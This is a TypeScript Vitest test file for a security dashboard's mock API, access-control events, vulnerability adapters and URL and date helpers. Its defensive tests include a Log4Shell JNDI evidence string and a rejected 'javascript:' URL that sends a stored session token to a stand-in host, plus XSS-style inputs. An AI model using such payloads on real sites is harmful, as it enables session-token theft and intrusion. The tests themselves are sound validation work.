import { describe, expect, it, vi } from 'vitest';
import type { AuthUser, RBACRole } from '@/types';
import { api, FEATURES, USE_MOCKS } from '@/services/api';
import {
  severityFromLabel,
  toDashboard,
  toVulnerability,
  VULN_STATUS_TO_LABEL,
  type BackendCampaign,
  type BackendDashboard,
  type BackendFinding,
} from '@/services/adapters';
import { FORBIDDEN_EVENT, UNAUTHORIZED_EVENT } from '@/lib/events';
import { HttpError } from '@/lib/errors';
import { isHttpUrl, localDayRange } from '@/lib/format';
import { buildMockToken } from '@/lib/jwt';
import { tokenStorage, userStorage } from '@/lib/storage';
import { MOCK_CREDENTIALS, MOCK_USERS } from '@/mocks/data';

// Camada de serviços em modo mock: fachada `api`, flags de capacidade, eventos
// globais de 401/403, adaptadores do backend e utilitários de formato.

const USER_ID_BY_ROLE: Record<RBACRole, string> = {
  admin: 'u-000',
  analyst: 'u-001',
  collaborator: 'u-002',
};

/** Grava uma sessão válida no storage (o mock lê o token de lá). */
function sessionFor(role: RBACRole, ttlMinutes = 30): AuthUser {
  const found = MOCK_USERS.find((candidate) => candidate.id === USER_ID_BY_ROLE[role]);
  if (!found) throw new Error(`Usuário mock não encontrado para o perfil ${role}`);
  const user: AuthUser = { id: found.id, name: found.name, email: found.email, role: found.role };
  tokenStorage.set(
    buildMockToken({ sub: user.id, email: user.email, name: user.name, role: user.role }, ttlMinutes),
  );
  userStorage.set(user);
  return user;
}

async function expectHttp(promise: Promise<unknown>, status: number, code?: string): Promise<HttpError> {
  try {
    await promise;
  } catch (err) {
    expect(err).toBeInstanceOf(HttpError);
    const http = err as HttpError;
    expect(http.status).toBe(status);
    if (code) expect(http.code).toBe(code);
    return http;
  }
  throw new Error(`esperava HttpError ${status}`);
}

/** Eventos `CustomEvent` capturados por um spy em `window.dispatchEvent`. */
function dispatchedEvents(spy: { mock: { calls: unknown[][] } }): CustomEvent[] {
  return spy.mock.calls
    .map(([event]) => event)
    .filter((event): event is CustomEvent => event instanceof CustomEvent);
}

describe('services/api — modo mock', () => {
  it('ativa os mocks em testes e liga todas as capacidades', () => {
    expect(USE_MOCKS).toBe(true);
    expect(Object.keys(FEATURES).sort()).toEqual(
      [
        'changePassword',
        'completeTraining',
        'multiRecipientCampaigns',
        'notificationPreferences',
        'passwordReset',
        'riskAcceptance',
        'userDelete',
        'userEdit',
      ].sort(),
    );
    expect(Object.values(FEATURES).every((flag) => flag === true)).toBe(true);
  });

  it('api.login resolve pela fachada preguiçosa com token JWT e usuário', async () => {
    const admin = MOCK_CREDENTIALS.find((credential) => credential.email === 'admin@empresa.com');
    if (!admin) throw new Error('Credencial de administrador ausente em MOCK_CREDENTIALS');

    expect(typeof api.login).toBe('function');
    // A fachada devolve sempre a mesma função por método (cache), sem expor a implementação.
    expect(api.login).toBe(api.login);

    const response = await api.login({ email: admin.email, password: admin.password });

    expect(response.token.split('.')).toHaveLength(3);
    expect(response.user).toMatchObject({ id: admin.userId, email: admin.email, role: 'admin' });
  });

  it('api.login rejeita credenciais inválidas com HttpError 401 sem derrubar sessão', async () => {
    const spy = vi.spyOn(window, 'dispatchEvent');

    await expectHttp(
      api.login({ email: 'admin@empresa.com', password: 'errada' }),
      401,
      'CREDENCIAIS_INVALIDAS',
    );

    expect(dispatchedEvents(spy).some((event) => event.type === UNAUTHORIZED_EVENT)).toBe(false);
  });

  it('colaborador em listVulnerabilities recebe 403 e o evento FORBIDDEN_EVENT é emitido', async () => {
    sessionFor('collaborator');
    const spy = vi.spyOn(window, 'dispatchEvent');

    const error = await expectHttp(api.listVulnerabilities(), 403, 'PERFIL_SEM_PERMISSAO');

    const forbidden = dispatchedEvents(spy).find((event) => event.type === FORBIDDEN_EVENT);
    expect(forbidden).toBeDefined();
    expect(forbidden?.detail).toMatchObject({
      status: 403,
      code: 'PERFIL_SEM_PERMISSAO',
      message: error.message,
    });
    expect(dispatchedEvents(spy).some((event) => event.type === UNAUTHORIZED_EVENT)).toBe(false);
  });

  it('token expirado gera 401 TOKEN_EXPIRADO e emite UNAUTHORIZED_EVENT', async () => {
    sessionFor('analyst', -1);
    const spy = vi.spyOn(window, 'dispatchEvent');

    await expectHttp(api.me(), 401, 'TOKEN_EXPIRADO');

    const unauthorized = dispatchedEvents(spy).find((event) => event.type === UNAUTHORIZED_EVENT);
    expect(unauthorized).toBeDefined();
    expect(unauthorized?.detail).toMatchObject({ status: 401, code: 'TOKEN_EXPIRADO' });
  });

  it('sem token gera 401 TOKEN_AUSENTE e também emite UNAUTHORIZED_EVENT', async () => {
    tokenStorage.clear();
    const spy = vi.spyOn(window, 'dispatchEvent');

    await expectHttp(api.getDashboard(), 401, 'TOKEN_AUSENTE');

    expect(dispatchedEvents(spy).some((event) => event.type === UNAUTHORIZED_EVENT)).toBe(true);
  });

  it('analista com sessão válida usa a fachada sem emitir eventos de autenticação', async () => {
    sessionFor('analyst');
    const spy = vi.spyOn(window, 'dispatchEvent');

    const list = await api.listVulnerabilities({ severity: 'critical' });

    expect(list.items.length).toBeGreaterThan(0);
    expect(list.items.every((item) => item.severity === 'critical')).toBe(true);
    expect(
      dispatchedEvents(spy).some(
        (event) => event.type === UNAUTHORIZED_EVENT || event.type === FORBIDDEN_EVENT,
      ),
    ).toBe(false);
  });
});

// ---- Adaptadores do backend -------------------------------------------------

const ISO = '2026-09-01T12:00:00.000Z';

function backendCampaign(overrides: Partial<BackendCampaign> = {}): BackendCampaign {
  return {
    id: 'c-1',
    nome: 'Simulação Q3',
    template: 'urgencia',
    status: 'Agendada',
    destinatarios: 24,
    taxaClique: 0,
    criadoEm: ISO,
    ...overrides,
  };
}

function backendDashboard(overrides: Partial<BackendDashboard> = {}): BackendDashboard {
  return {
    kpis: { vulnerabilidadesAbertas: 4, criticas: 1, resilienciaPhishing: 0, ativosMonitorados: 3 },
    distribuicaoSeveridade: { Crítico: 1, Alto: 1, Médio: 2 },
    vulnerabilidadesRecentes: [],
    alertas: [],
    campanhas: [],
    funil: null,
    campanhaAtiva: null,
    ...overrides,
  };
}

function backendFinding(overrides: Partial<BackendFinding> = {}): BackendFinding {
  return {
    id: 'f-1',
    ativo: 'srv-web-01.empresa.com',
    ativoNome: 'srv-web-01',
    categoria: 'A06:2021 - Vulnerable and Outdated Components',
    cvss: 10,
    severidade: 'Crítico',
    status: 'Aberta',
    descricao: 'Log4Shell (cve-2021-44228) em log4j-core 2.14.1',
    evidencia: 'GET /?x=${jndi:ldap://…} -> 200',
    detectadoEm: ISO,
    ...overrides,
  };
}

describe('services/adapters', () => {
  it('toDashboard: sem campanha disparada, resiliência é null e risco humano 0 (não medido ≠ 0 %)', () => {
    const dashboard = toDashboard(backendDashboard({ campanhas: [backendCampaign()] }));

    expect(dashboard.kpis.phishingResilience).toBeNull();
    expect(dashboard.humanRisk).toBe(0);
    expect(dashboard.kpis.activeCampaigns).toBe(0);
    expect(dashboard.kpis.trainedCollaborators).toBe(0);
    expect(dashboard.pendingTraining).toBeNull();
    expect(dashboard.severityDistribution).toMatchObject({
      critical: 1,
      high: 1,
      medium: 2,
      low: 0,
      info: 0,
    });
    expect(dashboard.recentCampaigns).toHaveLength(1);
  });

  it('toDashboard: sem nenhuma campanha também fica não medido', () => {
    const dashboard = toDashboard(backendDashboard());

    expect(dashboard.kpis.phishingResilience).toBeNull();
    expect(dashboard.humanRisk).toBe(0);
  });

  it('toDashboard: com envios, resiliência é medida e o risco humano deriva da taxa de clique', () => {
    const dashboard = toDashboard(
      backendDashboard({
        kpis: { vulnerabilidadesAbertas: 4, criticas: 1, resilienciaPhishing: 80, ativosMonitorados: 3 },
        campanhas: [backendCampaign({ status: 'Ativa', destinatarios: 100, taxaClique: 20 })],
      }),
    );

    expect(dashboard.kpis.phishingResilience).toBe(80);
    expect(dashboard.humanRisk).toBe(50);
    expect(dashboard.kpis.activeCampaigns).toBe(1);
    expect(dashboard.recentCampaigns[0]?.metrics).toMatchObject({ sent: 100, clicked: 20, clickRate: 20 });
  });

  it('VULN_STATUS_TO_LABEL não confunde "Risco aceito" com "Resolvida" (ida e volta)', () => {
    expect(VULN_STATUS_TO_LABEL.accepted).toBe('Risco aceito');
    expect(VULN_STATUS_TO_LABEL.resolved).toBe('Resolvida');
    expect(new Set(Object.values(VULN_STATUS_TO_LABEL)).size).toBe(Object.keys(VULN_STATUS_TO_LABEL).length);
    expect(toVulnerability(backendFinding({ status: 'Risco aceito' })).status).toBe('accepted');
    expect(toVulnerability(backendFinding({ status: 'Resolvida' })).status).toBe('resolved');
  });

  it('toVulnerability extrai CVE (normalizado) e id/categoria OWASP', () => {
    const vuln = toVulnerability(backendFinding());

    expect(vuln.cve).toBe('CVE-2021-44228');
    expect(vuln.owaspId).toBe('A06:2021');
    expect(vuln.owaspCategory).toBe('Vulnerable and Outdated Components');
    expect(vuln.severity).toBe('critical');
    expect(vuln.status).toBe('open');
    expect(vuln.cvss).toMatchObject({ version: '3.1', base: 10 });
    expect(vuln.assetName).toBe('srv-web-01');
    expect(vuln.evidence[0]?.content).toBe('GET /?x=${jndi:ldap://…} -> 200');
    expect(vuln.history[0]).toMatchObject({ action: 'detected', to: 'open' });
  });

  it('toVulnerability: sem CVE devolve null e categoria fora do padrão vira "OWASP"', () => {
    const vuln = toVulnerability(
      backendFinding({
        categoria: 'Cabeçalho CSP ausente',
        descricao: 'Resposta sem Content-Security-Policy',
        evidencia: 'HTTP/1.1 200 OK',
        severidade: 'Informativo',
        cvss: 0,
      }),
    );

    expect(vuln.cve).toBeNull();
    expect(vuln.owaspId).toBe('OWASP');
    expect(vuln.owaspCategory).toBe('Cabeçalho CSP ausente');
    expect(vuln.severity).toBe('info');
  });

  it('severityFromLabel tolera acento/caixa e cai para o CVSS quando o rótulo é desconhecido', () => {
    expect(severityFromLabel('Crítico')).toBe('critical');
    expect(severityFromLabel('critico')).toBe('critical');
    expect(severityFromLabel('ALTO')).toBe('high');
    expect(severityFromLabel('Médio')).toBe('medium');
    expect(severityFromLabel('baixo')).toBe('low');
    expect(severityFromLabel('Informativo')).toBe('info');
    expect(severityFromLabel('desconhecido', 5.5)).toBe('medium');
    expect(severityFromLabel(null, 9.1)).toBe('critical');
    expect(severityFromLabel(undefined)).toBe('info');
  });
});

// ---- lib/format -------------------------------------------------------------

describe('lib/format — localDayRange e isHttpUrl', () => {
  it('localDayRange cobre o dia inteiro no fuso LOCAL (00:00:00.000 a 23:59:59.999)', () => {
    const range = localDayRange('2026-09-20');
    expect(range).not.toBeNull();
    if (!range) return;

    expect(range.start).toBe(new Date(2026, 8, 20, 0, 0, 0, 0).getTime());
    expect(range.end).toBe(new Date(2026, 8, 20, 23, 59, 59, 999).getTime());
    expect(range.end - range.start).toBe(86_399_999);

    const start = new Date(range.start);
    expect([
      start.getFullYear(),
      start.getMonth(),
      start.getDate(),
      start.getHours(),
      start.getMinutes(),
    ]).toEqual([2026, 8, 20, 0, 0]);
    const end = new Date(range.end);
    expect([
      end.getDate(),
      end.getHours(),
      end.getMinutes(),
      end.getSeconds(),
      end.getMilliseconds(),
    ]).toEqual([20, 23, 59, 59, 999]);
    // Um agendamento às 22:00 locais do dia 20 cai dentro do intervalo do dia 20.
    expect(new Date(2026, 8, 20, 22, 0).getTime()).toBeLessThanOrEqual(range.end);
    expect(localDayRange(' 2026-09-20 ')).toEqual(range);
  });

  it('localDayRange devolve null para valores inválidos ou fora do formato aaaa-mm-dd', () => {
    expect(localDayRange('2026-13-40')).toBeNull();
    expect(localDayRange('2026-02-30')).toBeNull();
    expect(localDayRange('2026-9-2')).toBeNull();
    expect(localDayRange('20/09/2026')).toBeNull();
    expect(localDayRange('abc')).toBeNull();
    expect(localDayRange('')).toBeNull();
    expect(localDayRange(null)).toBeNull();
    expect(localDayRange(undefined)).toBeNull();
  });

  it('isHttpUrl aceita apenas http(s) e recusa javascript:/data: e afins', () => {
    expect(isHttpUrl('https://nvd.nist.gov/vuln/detail/CVE-2021-44228')).toBe(true);
    expect(isHttpUrl('http://owasp.org/Top10/')).toBe(true);
    expect(isHttpUrl('HTTPS://OWASP.ORG')).toBe(true);
    expect(isHttpUrl('  https://owasp.org  ')).toBe(true);

    expect(isHttpUrl('javascript:alert(1)')).toBe(false);
    expect(isHttpUrl("javascript:fetch('https://x/'+localStorage['baluarte.token'])")).toBe(false);
    expect(isHttpUrl('data:text/html;base64,PHNjcmlwdD4=')).toBe(false);
    expect(isHttpUrl('ftp://arquivos.empresa.com')).toBe(false);
    expect(isHttpUrl('//owasp.org')).toBe(false);
    expect(isHttpUrl('https://')).toBe(false);
    expect(isHttpUrl('https://a b')).toBe(false);
    expect(isHttpUrl('')).toBe(false);
    expect(isHttpUrl(null)).toBe(false);
    expect(isHttpUrl(undefined)).toBe(false);
  });
});
